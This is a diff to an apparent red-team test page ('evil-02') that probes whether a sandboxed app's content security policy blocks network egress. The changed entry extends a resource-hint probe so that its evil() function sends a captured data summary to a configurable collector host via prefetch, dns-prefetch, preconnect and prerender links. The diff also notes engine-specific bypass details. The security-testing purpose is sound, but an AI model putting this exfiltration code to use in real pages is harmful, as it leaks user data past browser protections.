@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>evil-02 CSP & network egress</title>
-<meta name="description" content="Red-team napplet: NIP-5D CSP baseline egress probes — every network primitive, plus WebRTC (no directive covers it) and the grandchild-frame fresh-realm WebRTC vector (kehto/web#381), probed by a kehto/web#393-mirror nested-context bypass battery.">
+<meta name="description" content="Red-team napplet: NIP-5D CSP baseline egress probes — every network primitive, plus WebRTC (no directive covers it) and the grandchild-frame fresh-realm WebRTC vector (kehto/web#381), probed by a kehto/web#393-mirror nested-context bypass battery, plus resource-hint egress (prefetch/dns-prefetch/preconnect/prerender) that default-src 'none' does not reliably govern.">
 <meta name="napplet-id" content="evil-02-csp-egress">
 <!--
   evil-napplets ROE (see repo README):
@@ -756,30 +756,40 @@ const ATTACKS = [
     },
   },
   {
-    id: 'prefetch-hint',
-    name: 'prefetch / dns-prefetch hints',
-    target: 'no CSP directive governs prefetch',
+    id: 'resource-hints',
+    name: 'resource hints — prefetch / dns-prefetch / preconnect / prerender',
+    target: 'default-src \'none\' does not reliably govern resource hints',
     severity: 'low',
-    harm: 'Prefetch and dns-prefetch hint loads are not observable as fetches and not covered by connect-src — a covert egress/traffic-shaping channel.',
+    harm: 'Resource-hint loads are not observable as fetches from inside the frame and are not reliably governed by the napplet CSP. CSP3 ED (w3c/webappsec-csp@e3461f7) places prefetch/prerender under default-src, so a browser that lets them through under default-src \'none\' is non-conformant. prerender issues a real HTTP GET (Sec-Purpose: prefetch) in Chromium; preconnect opens a TCP connection (WebKit) or DNS+TCP (Chromium with network prediction); dns-prefetch resolves DNS (Chromium with prediction, Firefox with DNS prefetch enabled) — a covert egress / traffic-shaping channel per engine (see ROADMAP finding 15 for the table).',
+    evilBrief: 'Inserts prefetch, dns-prefetch, preconnect, and prerender hint links at the collector — point the collector at a local sink (http(s)/TCP/DNS) to OBSERVE the egress rather than assume it. prerender carries the captured summary in the query string of a real HTTP GET.',
     async demo() {
       const inserted = [];
-      const before = { ok: true };
-      for (const rel of ['prefetch', 'dns-prefetch']) {
+      // Local-sink mode: egress is observed OUTSIDE the frame (no in-frame
+      // violation/load event), so demo mode points the hints at the
+      // non-resolving NX host and stays honest — na, not armed.
+      for (const rel of ['prefetch', 'dns-prefetch', 'preconnect', 'prerender']) {
         const link = document.createElement('link');
         link.rel = rel;
         link.href = NX + '?ev=' + rel;
         document.head.appendChild(link);
         inserted.push(rel);
-        setTimeout(() => link.remove(), 1000);
+        setTimeout(() => { try { link.remove(); } catch (_) {} }, 1200);
       }
-      return na('inserted ' + inserted.join(', ') + ' hint links — success is NOT verifiable from inside the frame (no violation event, no load event). CSP does not govern prefetch: treat the channel as open unless your platform blocks hints (Permissions-Policy / browser flags)');
+      return na('inserted ' + inserted.join(', ') + ' hint links — success is NOT verifiable from inside the frame (no violation event, no load event, no error). CSP does not reliably govern resource hints: point the collector at a local sink to OBSERVE the egress (prerender → HTTP GET with Sec-Purpose; preconnect → TCP; dns-prefetch → DNS). Playwright\'s default context disables network prediction, so run the real Chromium channel with --enable-features=NetworkPrediction to see preconnect/dns-prefetch; prerender fires regardless. Per-engine table in ROADMAP finding 15.');
     },
     async evil() {
-      const link = document.createElement('link');
-      link.rel = 'prefetch';
-      link.href = state.collector + '?ev=prefetch-exfil&payload=' + encodeURIComponent(captureSummary().slice(0, 512));
-      document.head.appendChild(link);
-      return { result: 'prefetch hint exfil dispatched to ' + state.collector };
+      const summary = encodeURIComponent(captureSummary().slice(0, 512));
+      const fired = [];
+      for (const rel of ['prefetch', 'dns-prefetch', 'preconnect', 'prerender']) {
+        const link = document.createElement('link');
+        link.rel = rel;
+        // prerender/prefetch carry the payload in a real request URL; preconnect/
+        // dns-prefetch only reach the host (TCP/DNS), so the host itself is the signal.
+        link.href = state.collector + '?ev=' + rel + '-exfil&payload=' + summary;
+        document.head.appendChild(link);
+        fired.push(rel);
+      }
+      return { result: 'resource-hint exfil dispatched to ' + state.collector + ' (' + fired.join(', ') + ') — observe at the sink; prerender carries the payload in an HTTP GET' };
     },
   },
 ];
